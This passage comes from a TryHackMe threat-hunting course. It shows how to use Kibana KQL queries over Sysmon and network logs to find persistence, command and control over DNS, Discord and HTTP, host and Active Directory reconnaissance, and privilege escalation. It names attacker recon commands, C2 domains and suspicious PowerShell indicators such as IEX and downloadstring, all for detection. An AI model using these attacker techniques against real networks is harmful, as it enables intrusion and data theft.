![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ac7d3fa1402bafe019e15c403bdcc34.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ac7d3fa1402bafe019e15c403bdcc34.png)

*Click to enlarge the image*

Based on the results, it can be observed that there is one entry that is highly suspicious due to the following values:

- Registry Path: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1`
- Registry Data: `C:\Windows\Temp\installer.exe`

This entry indicates that the binary `C:\Windows\Temp\installer.exe` will be executed on the machine's startup, which is the suspicious binary identified previously.

An
 alternative way of hunting unusual registry modifications is through 
process filtering. By specifying what process modified the registry, we 
can find notable changes based on the process used to execute it. The 
KQL query below hunts for registry modifications using `reg.exe` or `powershell.exe`.

`host.name:
 WKSTN-* AND winlog.event_id: 13 AND winlog.channel: 
Microsoft-Windows-Sysmon/Operational AND process.name: (reg.exe OR 
powershell.exe)`

Using this query, the modifications made via `reg.exe` was shown immediately.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cbb4d15a05e542a228b3cddbfbe0d21a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cbb4d15a05e542a228b3cddbfbe0d21a.png)

*Click to enlarge the image*

Note
 that this query cannot cover registry modifications made by other 
binaries interacting directly with the registry since it only hunts for 
the usage of reg.exe or powershell.exe. However, suspicious binaries 
interacting with the registry can still be hunted by excluding all known
 good binaries from the query.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the events generated by the parent process of cmd.exe that 
executed the malicious registry modification. With this, we can 
backtrack the events before the persistence was implanted. Moreover, it 
is also good to hunt subsequent activities after the persistence was 
planted to see the following actions made by the attacker.

**Command and Control**

# Tactic: Command and Control

The [Command and Control Tactic (TA0011)](https://attack.mitre.org/tactics/TA0011/)
 involves the methods by which an adversary communicates with the 
compromised systems within a target network. This is the stage at which 
an attacker usually directs or continuously issues remote commands to 
the compromised system to fulfil the attacker's objectives, such as 
further internal network compromise. Communication can occur via various
 channels, such as:

- Standard network protocols, such as DNS, ICMP, HTTP/s.
- Known cloud-based services.
- Encrypted custom HTTP/s server.

Moreover,
 these methods provide a lifeline between the attacker and the 
infiltrated network, enabling two-way communication for the attacker to 
send commands and receive data. The Command and Control stage is 
particularly critical as the attacker solidifies their control over the 
compromised systems, adjusting their actions based on the information 
obtained or according to their ultimate goal.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the provided examples 
above, as there are more ways to establish continuous communication with
 the compromised machine. However, we will use these examples to 
understand this tactic and grasp how to hunt it.

The
 common intersection of the examples above is using a communication 
channel that typically blends in with regular network traffic, making 
the hunt for malicious activities more challenging.

| **Command and Control Technique** | **Examples** |
| --- | --- |
| Standard network protocols | Using the DNS protocol as a communication channel via its subdomain. |
| Known cloud-based services | Passing traffic through known web applications such as Google Drive, Telegram, and Discord. |
| Encrypted custom HTTP/s server | Using a self-hosted server with a well-groomed domain passing encrypted traffic. |

In
 determining unusual network traffic, it is also essential to understand
 the purpose of the traffic based on its contents, frequency and 
direction. A good example would be:

- Egress traffic may indicate suspicious file uploads or connections to a C2 server.
- Ingress traffic may indicate intrusion attempts from external sources.
- Cleartext traffic containing host commands may indicate an established connection to a C2 server.
- A high count of connections or bandwidth of encrypted traffic may indicate unusual activity.

# Hunting Command and Control

The
 hunt for Command and Control involves uncovering these covert 
communication channels amidst regular network traffic. Adversaries use 
standard protocols to blend in with typical network traffic or use cloud
 storage services as unconventional command channels to avoid raising 
suspicion. In the following sections, we will delve deeper into 
strategies and techniques for hunting Command and Control activities, 
interpreting network events, and recognising anomalies through the 
following scenarios:

- Command and Control over DNS.
- Command and Control over third-party cloud applications.
- Command and Control over encrypted HTTP traffic.

# Command and Control over

Starting with this scenario, we will use the `packetbeat-*` index and hunt for potential C2 over DNS on July 3, 2023. In addition, we will use the `winlogbeat-*` index to correlate the DNS
 queries to identify the malicious process generating it. Ensure all 
queries to the Kibana console are set to look for the right index and 
timeframe.

C2
 over DNS, or more accurately Command and Control over DNS, is a 
technique used by adversaries where DNS protocols are utilised to 
establish a Command and Control channel. In this technique, adversaries 
can disguise their C2 communications as typical DNS queries and 
responses, bypassing network security measures. Given this, we will hunt
 for unusual DNS query patterns based on the following:

- High count of unique subdomains
- Unusual DNS requests based on query types (MX, CNAME, TXT)

To
 start hunting, use the Visualize Library again and create a 
visualisation table using Lens. Ensure that the table is configured with
 the following:

- Set the Table Index (packetbeat), Rows
(dns.question.registered_domain and host.name), and Metrics (Unique
Count of dns.question.subdomain).
- Use the KQL query to list all DNS queries and exclude all reverse DNS lookups:`network.protocol: dns AND NOT dns.question.name: *arpa`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/865a9751c4a18147548b8cff01ab6a9a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/865a9751c4a18147548b8cff01ab6a9a.png)

*Click to enlarge the image*

Upon checking the results above, it can be observed that an unusual domain (`golge[.]xyz`) queried 2191 unique subdomains, which may indicate a potential C2 over DNS activity coming from `WKSTN-1`.
 To better understand the attack, we can continue the investigation 
using the Discover tab with a query focused on this domain and the 
potentially compromised host. Let's use the following KQL query in the 
Discover tab on `packetbeat-*` index:

`network.protocol: dns AND NOT dns.question.name: *arpa AND dns.question.registered_domain: golge.xyz AND host.name: WKSTN-1`

We can also add the `query` field as a column to see its values.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8e39190bffa7de54fd56bc460a592b4a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8e39190bffa7de54fd56bc460a592b4a.png)

*Click to enlarge the image*

Based
 on the results, the workstation seems to be continuously querying on 
*[.]golge[.]xyz, using different query types (CNAME, TXT and MX) and 
using hexadecimal subdomains. In addition, it was also seen that the 
workstation sends the DNS requests directly to an unknown nameserver, bypassing the DNS servers configured in the workstation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f603f27024a4c2851fc5f93fde63826f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f603f27024a4c2851fc5f93fde63826f.png)

*Click to enlarge the image*

Now that we have enough information, we can correlate this activity on `winlogbeat-*` to identify the process executing the DNS requests using the following KQL query:

`host.name: WKSTN-1* AND destination.ip: 167.71.198.43 AND destination.port: 53`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.parent.command_line
- process.name
- process.command_line

**Note: Add the field columns first before executing the KQL query.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/802fcf147063697602bc7fad5ac2e5ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/802fcf147063697602bc7fad5ac2e5ae.png)

*Click to enlarge the image*

Based on the results, it can be observed that all connections to 167[.]71[.]198[.]43:53 are generated by `nslookup.exe`. To continue the event correlation, let's use View surrounding documents to see the subsequent events related to this activity.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/85da84331a98a93fc99a29c7fc8f606a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/85da84331a98a93fc99a29c7fc8f606a.png)

*Click to enlarge the image*

The surrounding documents have provided the command line arguments of the parent process executing `nslookup.exe`. Based on its values, the suspicion of C2 over DNS is confirmed.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the events generated by the parent process of nslookup.exe that
 established C2
 over DNS. This can backtrack the events before a successful C2 
connection was established. Moreover, observe the subsequent commands 
executed by the parent process as remote commands are expected to be 
executed since a C2 connection was confirmed to be running.

On a footnote, the packet size (in this Kibana
 setup, the network.bytes field) may also indicate an unusual DNS 
traffic. DNS queries are typically short, and as shown in the example 
above, the subdomain was used to handle a long hex string for the C2 
connection. Given this, it is highly recommended also to utilise the 
request/response size in determining potential anomalies within a DNS 
traffic.

# Command and Control over Cloud Apps

In the following scenario, we will still use the `packetbeat-*`
 index and hunt for Command and Control over known Cloud Applications 
from employee workstations on July 3, 2023. In addition, we will use the
 `winlogbeat-*` index to correlate the network connections to identify the malicious process generating it. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

In C2
 over Cloud Applications, adversaries use known cloud applications to 
establish a Command and Control channel. In this technique, adversaries 
can disguise their C2 communications as a typical web connection to a 
known-good cloud application, bypassing network security measures. We 
will search for cloud applications indicating a potential C2 channel.

To start hunting, we will use the same visualisation table of C2
 over DNS. However, we will remove the unique subdomain metric and sort 
the count in ascending order. With this setup, we can see cloud 
application domains that workstations do not commonly access.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d36f34dcc5077e39c9ebc2f47408d5fe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d36f34dcc5077e39c9ebc2f47408d5fe.png)

*Click to enlarge the image*

Upon
 seeing the results, discord.gg, a known cloud application, is being 
used by WKSTN-1. Threat actors are using this application to host their C2 traffic. We can use this as a lead to investigate its unusual usage. With this information, we can pivot to `winlogbeat-*` index to correlate the associated process and use the following KQL query: `host.name: WKSTN-1* AND *discord.gg*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b645a11f38ee71500d8db738fd313287.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b645a11f38ee71500d8db738fd313287.png)

*Click to enlarge the image*

Based on the results, it can be seen that the connections going to Discord are initiated by **C:\Windows\Temp\installer.exe**. We can investigate further by hunting all processes spawned by this process using the following KQL query:

`host.name: WKSTN-1* AND winlog.event_id: 1 AND process.parent.executable: "C:\\Windows\\Temp\\installer.exe"`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/54a2a40ceae8f7e0646bf0233c2ea8b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/54a2a40ceae8f7e0646bf0233c2ea8b6.png)

*Click to enlarge the image*

Upon seeing the results, it can be observed that `installer.exe` has executed multiple cmd.exe commands, confirming the suspicion of C2 over Discord. Following
 a threat hunter's mindset, the next step of this investigation is to 
identify all events generated by installer.exe that established C2 over Discord.

# Command and Control over Encrypted Traffic

For the last scenario, we will still the `packetbeat-*` index and hunt for Command and Control over Encrypted HTTP traffic from employee workstations on July 3, 2023. In addition, we will use the `winlogbeat-*` index to correlate the network connections to identify the malicious process generating it. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Compared to the first two C2
 techniques, C2 over Encrypted HTTP traffic is just a typical command 
and control type. The main notable thing about this technique is that 
attackers use their own C2 domain, including custom traffic encryption 
over HTTP. Given this, we will hunt for unusual HTTP traffic based on 
the following:

- High count of HTTP traffic to distinctive domains
- High outbound HTTP bandwidth to unique domains

To
 start hunting, use the Visualize Library again and create a 
visualisation table using Lens. Ensure that the table is configured with
 the following:

- Set the Table Index (packetbeat), Rows (host.name, destination.domain, http.request.method), and Metrics (count).
- Use the KQL query to list all outbound HTTP requests:`network.protocol: http AND network.direction: egress`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2e5532368e2226e225401380bb69a597.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2e5532368e2226e225401380bb69a597.png)

*Click to enlarge the image*

Based on the results, it is highly notable that HTTP
 connections to cdn[.]golge[.]xyz from both workstations are numerous. 
This may indicate that a continuous C2 connection has been running for 
an extended time. We can modify the Lens table and focus the query to 
cdn[.]golge[.]xyz using this KQL query to understand better:

`host.name: WKSTN-* AND network.protocol: http AND network.direction: egress AND destination.domain: cdn.golge.xyz`

In addition, we can modify the rows and focus only on `host.name` and `query` fields.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f1a1675f4d83698f52696047561fa1e9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f1a1675f4d83698f52696047561fa1e9.png)

*Click to enlarge the image*

Based on the results, it can be observed that the volume of requests is GET requests to 3 .php endpoints. Moreover, it can be inferred that the malware used to establish the C2 server is identical since the endpoints accessed by both workstations are similar. Given all this network information, we can now pivot to `winlogbeat-*` index and correlate this network activity to associated processes.

Using the following KQL query provided us with some insights regarding the associated process: `host.name: WKSTN-* AND *cdn.golge.xyz*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8fb64e55f142870cc480d204f4a10998.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8fb64e55f142870cc480d204f4a10998.png)

*Click to enlarge the image*

Based on the results, it can be inferred that the C2 connection to cdn[.]golge[.]xyz was established using a malicious PowerShell command.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the extent of these malicious activities by correlating the 
subsequent events generated after the C2 connection to cdn[.]golge[.]xyz was established.
 Moreover, it is also good to trace back how the attacker gained initial
 access in the first place before attempting to develop continuous C2 access.

**Conclusion**

Congratulations!
 You have completed hunting different indicators of compromise and 
suspicious host and network activities in this room.

To conclude the room, let's summarise the different hunting methodologies that we discussed throughout the room:

| Tactic | Hunting Methodology |
| --- | --- |
| Initial Access | • Seek patterns of numerous failed login attempts to external services, followed by a successful authentication.
• Monitor intrusion attempts on web applications and potential code execution on web servers.
• Look for unusual file downloads and temporary files created by Outlook clients.
• Correlate all subsequent events after the successful intrusion attempt. |
| Execution | • Identify excessive usage of cmd.exe and powershell.exe.
• Spot misused legitimate operating system binaries and scripts (LOLBAS) and correlate their subsequent execution.
• Look for potential abuse of installed programming tools.
• Utilise the parent-child relationships of processes to connect associated events. |
| Defence Evasion | • Look for attempts to disable security software.
• Keep an eye out for log deletion events.
• Look for process injection activities.
• Correlate all evasion activities to their parent process and find subsequent events if the evasion attempt succeeded. |
| Persistence | • Watch out for the creation of scheduled tasks.
• Look for suspicious registry modifications on known registries used for persistence.
• Correlate all persistence activities back to their parent process. |
| Command and Control | • Look for a high count of unique subdomains on a single domain.
• Spot unusual outgoing connections to cloud services/applications.
• Look for an unusual number of outbound connections to an unfamiliar domain.
• Correlate all unusual activity back to its associated process. |

In essence, the list below generalises the usual progression of an attacker's thought process to obtain a foothold:

1. Intrusion into external assets or through deceptive tactics like phishing.
2. Triggering the initial payload chains multiple ways to execute commands, including evasion of various security controls.
3. Implanting persistence on compromised assets.
4. Establishing a reliable channel for command and control.

Bear
 in mind; hunting can commence at any phase of the attack. The key lies 
in correlating events across the attack chain to form a complete picture
 of the threat actor's actions.

This 
room covered the early steps an attacker takes post-establishing a 
foothold. Threat actors may further explore once inside the network, 
moving laterally across different systems. If you found this room 
valuable, continue enhancing your threat-hunting knowledge by proceeding
 to [Threat Hunting: Pivoting](https://tryhackme.com/room/threathuntingpivoting).

## **THREAT HUNTING:PIVOT**

**Discovery**

**Tactic: Discovery**

The [Discovery Tactic (TA0007)](https://attack.mitre.org/tactics/TA0007/)
 refers to the actions an attacker may take to understand better the 
systems and networks they have infiltrated. This involves identifying 
system and network configurations, finding sensitive data, or 
identifying other potential targets within the network. Example 
techniques used by adversaries are the following:

- Obtaining current user information and privileges, such as groups and accessible assets.
- Enumerating host information, such as its operating system, installed applications, and implemented security controls.
- Understanding internal network topology through hosts and services scanning.
- Listing internal domain information, such as domain users, groups, and access control lists.

Moreover,
 these examples are typically used to enumerate information for the 
disposal of the following tactics to complete the objective. As 
elaborated, this step is crucial in further identifying an attacker's 
next steps to infiltrate the internal infrastructure.

To understand the tactic further, let's dive deep into more detailed scenarios and how it can be seen through event logs.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the examples above, as 
there are different ways for an adversary to enumerate the information 
needed to proceed with the attack. However, we will use these examples 
to understand this tactic and grasp how to hunt it.

The common 
intersection of the examples above is executing built-in commands or 
initiating network connections to gather information.

| **Discovery Technique** | **Examples** |
| --- | --- |
| User Reconnaissance | Using built-in commands like `whoami`, `net user`, `net localgroup` or `qwinsta` for account enumeration and `dir` or `ls` for file and folder enumeration. |
| Host Reconnaissance | Commands such as `hostname`, `wmic`, `ipconfig` or `systeminfo` for gathering host information, `net start` or `sc.exe query`
 for service enumeration, and simply navigating through GUI-based 
applications like Windows Security to determine the security controls 
running in the compromised host. |
| Internal Scanning | Displaying arp table (via `arp` command), sweeping reachable assets via `ping`, and scanning open ports using different tools, such as Nmap or PowerShell (leveraging built-in capabilities). |
| Internal Domain Reconnaissance | Using built-in commands like `net * /domain` or `nltest /dclist` or loading known PowerShell commands and scripts to list domain users (PowerView or BloodHound) to enumerate domain objects. |

To
 summarise, all commands that are typically used to display host or user
 information can be used by an attacker in this tactic. Quickly,
 the ways to enumerate data are not limited to the provided commands 
(most examples above are for Windows). There are a lot of variations on 
how to gather these data, such as via PowerShell commands or built-in Unix commands.

# Hunting Discovery

The
 hunt for the Discovery Tactic involves detecting unusual 
information-gathering activities that typically blend with host and 
network administration commands. This may entail identifying known tools
 System Administrators use or some activities to gather host and network
 data and differentiating benign activities from suspicious ones based 
on their unusual patterns. In line with this, we will use the following 
scenarios to build our hunting methodology.

- Host reconnaissance activity
- Internal network scanning
- Active directory execution

# Host Reconnaissance

Starting with this scenario, we will use the `winlogbeat-*` index
 to hunt for unusual behaviours of host information reconnaissance from 
all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

System Administrators typically use built-in tools for host information gathering, whether commands for identifying the OS version of the host or the processes running inside the machine. However, threat actors commonly abuse it to collect important
 host information, which can be leveraged to tailor potential attack 
vectors. Given this, we will hunt for behaviours that show numerous uses
 of built-in tools spawned by unusual processes.

Using the **Discover** tab, we will focus on the following command-line tools:

- whoami.exe
- hostname.exe
- net.exe
- systeminfo.exe
- ipconfig.exe
- netstat.exe
- tasklist.exe

By using the following KQL query, we will hunt process creations (Sysmon Event ID 1) generated by these two tools:

`winlog.event_id:
 1 AND process.name: (whoami.exe OR hostname.exe OR net.exe OR 
systeminfo.exe OR ipconfig.exe OR netstat.exe OR tasklist.exe)`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.parent.command_line
- process.command_line

Lastly,
 sort the timestamp in ascending order to view the sequence of attacks 
from the earliest execution timestamp (click the arrow beside the **Time** column).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e726a90eecb5c092ba657f5ce05a0557.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e726a90eecb5c092ba657f5ce05a0557.png)

Based on the results, it can be seen that `bill.hawkins` has executed multiple enumeration tools on `WKSTN-2`. Moreover, all commands were spawned by `cmd.exe`.
 On a quick look, this might not indicate any unusual activities since 
System Administrators typically do remote login and spawn Windows 
Command Processor to execute troubleshooting and host identification 
commands. Let's continue the investigation by diving deeper into the `cmd.exe` process.

To do this, we can get the parent process ID of these logs to get the process identifier of the unusual `cmd.exe` process. Click the drop-down button of the first execution of the `whoami /priv` command and find the `process.parent.pid`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fec089cc4be37911265e7b7ec455a7db.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fec089cc4be37911265e7b7ec455a7db.png)

Using this parent PID, we can create a new KQL query focusing on the `cmd.exe` process creations on `WKSTN-2` related to the enumeration commands used.

`host.name: WKSTN-2* AND winlog.event_id: 1 AND process.pid: 6324`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0b2483557cc941ef746e6b2ec6ee11f6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0b2483557cc941ef746e6b2ec6ee11f6.png)

Based on the result, it seems that the cmd.exe was spawned by PowerShell.exe, containing suspicious indicators like `IEX`, `downloadstring`, `-WindowStyle hidden`, and `-ep bypass`. From a security analyst's perspective, this may indicate that the script downloaded by the PowerShell
 script may be a reverse shell script or a command and control agent, 
which confirms the suspicion of enumeration commands executed on `WKSTN-2`.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the extent of the attack by checking the child processes 
spawned by the malicious PowerShell
 process. Moreover, it is also essential to understand how the execution
 of PowerShell started (you may remember this if you have gone through 
the Threat Hunting: Foothold room).

# Internal Network Scanning

In the following scenario, we will use the `packetbeat-*` index
 to hunt for unusual internal network connections from all hosts on July
 9, 2023. Moreover, we will correlate the network activity and identify 
the process that initiated the network connection through the `winlogbeat-*` index. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Internal
 network connections are always presumed to be benign due to the 
assumption that they originate from legitimate host services and user 
activity. However, threat actors tend to blend from this noise while 
enumerating reachable assets for potential pivot points. One example is 
scanning open ports on a reachable device, which generates several 
connections to unique destination ports. We will hunt for behaviours 
that satisfy this idea.

To start hunting, use the **Visualize Library** and create a visualisation table using **Lens**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c16118a13ab17f90a828493bcd03e18.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c16118a13ab17f90a828493bcd03e18.png)

Next, configure the table with the following setup:

1. Set the Table Index (packetbeat), Rows (host.name, source.ip and
destination.ip), and Metrics (Unique count of destination.port).
2. Use the KQL query below to view all internal network connections to well-known ports:

`source.ip: 10.0.0.0/8 AND destination.ip: 10.0.0.0/8 AND destination.port < 1024`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8855123c7257c05b7d0fd5ebf57d7770.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8855123c7257c05b7d0fd5ebf57d7770.png)

Upon
 checking the results above (highlight #4), it can be observed that the 
table provided the workstations indicating a potential port scanning 
activity. These two hosts (`INTSRV01` AND `WKSTN-2`) are highly notable since they generated connections to 1023 unique destination ports.

Given all this network information, we can now pivot to `winlogbeat-*` index using the **Discover**
 console and correlate this network activity to associated processes. 
Let's use the following KQL query to identify the process that initiated
 the network connections, specifying the source and destination address.

`winlog.event_id: 3 AND source.ip: 10.10.184.105 AND destination.ip: 10.10.122.219 AND destination.port < 1024`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.name
- destination.port

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e5bbdf92202ee58aa4c9ae0fc846563a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e5bbdf92202ee58aa4c9ae0fc846563a.png)

Using Sysmon Event ID 3 (Network Connection), we were able to correlate the potential port scanning activity to a process named `n.exe`. Moreover, it can be concluded that the originating host is from `WKSTN-2` and the target is `INTSRV01`. This activity seems suspicious since all these connections were initiated by a user account, not a system or service account.

**Note: Only successful connections established are logged by Sysmon Event ID 3, meaning all these ports logged were identified as open.**

Following a threat hunter's mindset, the next step of this investigation is to identify the events generated by `n.exe` and
 its parent process. This can backtrack the events before the execution 
of the port scanning activity. Moreover, the attacker may utilise the 
information gathered, so it is good to investigate unusual network 
connections to these identified open ports.

# Active Directory Enumeration

For the last scenario, we will use the `winlogbeat-*` index to hunt for potential domain reconnaissance activity from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Domain
 Enumeration typically generates many LDAP queries. However, it is also 
typical for an internal network running an Active Directory to create 
this activity. Given this, threat actors tend to blend in the regular 
traffic to mask their suspicious activity of harvesting active directory
 objects to tailor their potential internal attack vectors. Based on 
this, we will focus on unusual LDAP connections.

Using the **Discover**
 tab, we will focus on hunting processes that initiated an LDAP network 
connection (port 389 for LDAP and port 636 for LDAP over SSL). By using 
the following KQL query, we will hunt for these processes using Sysmon Event ID 3:

`winlog.event_id:
 3 AND source.ip: 10.0.0.0/8 AND destination.ip: 10.0.0.0/8 AND 
destination.port: (389 OR 636) AND NOT process.name: mmc.exe`

**Note: We have excluded `mmc.exe` from the query since this process typically generates benign LDAP connections.**

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.name
- destination.port

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c7f5dfc2ec94bf900c23b106155e4632.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c7f5dfc2ec94bf900c23b106155e4632.png)

Based on the results, three processes initiated an LDAP connection, one of which is a highly notable binary - `SharpHound.exe`. This binary is a well-known tool primarily used for reconnaissance and data collection within Active Directory (AD) environments.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the subsequent actions made after the execution of SharpHound. 
Undoubtedly, the attacker will leverage the information gathered through
 this tool and may attempt to abuse Active Directory configuration or 
move laterally to other internal hosts. Moreover, it is also essential 
to investigate the parent process activity, which may lead to the 
discovery of potentially malicious activities.

**Privilege Escalation**

# Tactic: Privilege Escalation

The [Privilege Escalation Tactic (TA0004)](https://attack.mitre.org/tactics/TA0004/)
 involves techniques that allow an attacker to gain higher privileges or
 permissions on a system or network. It's a crucial step in an attack 
because it can provide the attacker with increased access and control, 
allowing them to target sensitive data and modify critical system 
components. Common techniques include:

- Exploiting of privilege escalation vulnerabilities.
- Using valid accounts with higher privileges.
- Abusing misconfigured access controls.
- Leveraging host misconfiguration on services and applications.

Moreover,
 these examples are typically used to elevate the attacker's foothold, 
transforming from mere low-privileged access to comprehensive control. 
This access progression allows for broader manipulation of the system or
 network, granting the attacker capabilities to execute subsequent 
phases of the attack, such as lateral movement or data exfiltration.

To understand the tactic further, let's dive deep into more detailed scenarios and how it can be seen through event logs.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the examples above, as 
there are different ways for an adversary to obtain higher privileges. 
However, we will use these examples to understand this tactic and grasp 
how to hunt it.

The common intersection of the examples above is 
abusing host and account configuration due to a lack of patches or 
security controls.

| **Privilege Escalation Technique** | **Examples** |
| --- | --- |
| Exploitation of vulnerabilities | Using known userland and kernel exploits on unpatched hosts. |
| Usage of valid accounts | Using **runas** commands with newly-discovered credentials or re-authenticating with a privileged account in the same machine. |
| Access control abuse | Abusing overly permissive Access Control Lists (ACLs), allowing other accounts to grant or acquire additional permissions. |
| Host misconfiguration abuse | Abusing insecure service configurations, such as modifiable and restartable services or overwritable service binaries. |

To summarise, the tactic focuses on elevating access privileges in 
various ways to exert greater control over the system or network. This 
escalated access paves the way for them to manipulate system components,
 access sensitive data, and progress deeper into the network, bringing 
them one step closer to their ultimate objective.

# Hunting Privilege Escalation

We
 focus on hunting Privilege Escalation as we continue our deep dive into
 the adversary's playbook. As discussed, this method encompasses various
 adversaries' techniques to escalate privileges and obtain further 
access to the compromised network.

You
 may think that hunting successful privilege escalation attempts can be 
as easy as looking for unusual events executed by privileged accounts. 
However, differentiating them from benign activity could be bothersome 
since these accounts spawn most activities run by the operating system 
or System Administrators. To build our methodology, we will use the following scenarios to uncover the traces of this tactic:

- Elevating access through **SeImpersonatePrivilege** abuse.
- Abusing excessive service permissions.

# Abusing SeImpersonatePrivilege

Starting with this scenario, we will use the `winlogbeat-*` index to hunt for unusual processes spawned by the **SYSTEM** account from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Successful
 privilege escalation attempts always indicate activities generated by a
 privileged account. In the context of abusing machine vulnerabilities, 
the user access is typically elevated to the **NT Authority\System** 
account. Given this, we will attempt to hunt for processes executed by 
low-privileged accounts that led to a SYSTEM account access.

Using the **Discover**
 tab, we will hunt for processes spawned by the SYSTEM account 
accompanied by a parent process executed by a low-privileged account. We
 will use the following KQL query to hunt this behaviour:

`winlog.event_id: 1 AND user.name: SYSTEM AND NOT winlog.event_data.ParentUser: "NT AUTHORITY\SYSTEM"`

**Note:
 We have excluded events with a value of NT AUTHORITY\SYSTEM on its 
ParentUser field since these events do not indicate privilege 
escalation.**

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.parent.command_line
- process.command_line
- winlog.event_data.ParentUser

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fb8d932459bf8ca20d44ed591bc449fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fb8d932459bf8ca20d44ed591bc449fa.png)

Based on the results, one of the notable entries is the process spawned by the `IIS APPPOOL\DefaultAppPool` user. This user executed a binary named `spoofer.exe`,
 which resulted in a process generated by a SYSTEM account. Moreover, 
this user account is the default account for running an IIS Web Server 
and does not commonly execute unusual processes. This behaviour might 
indicate a potential remote code execution from a web server and a 
successful privilege escalation attempt.

Let's dig deeper by analysing the details of the `spoofer.exe` process using the following KQL query:

`winlog.event_id: 1 AND process.name: spoofer.exe`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/522573dc5601b9f572128f46cdedfee4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/522573dc5601b9f572128f46cdedfee4.png)

Based on the result, it can be observed that a suspicious encoded PowerShell
 command (Parent Process) spawned the spoofer process. To understand the
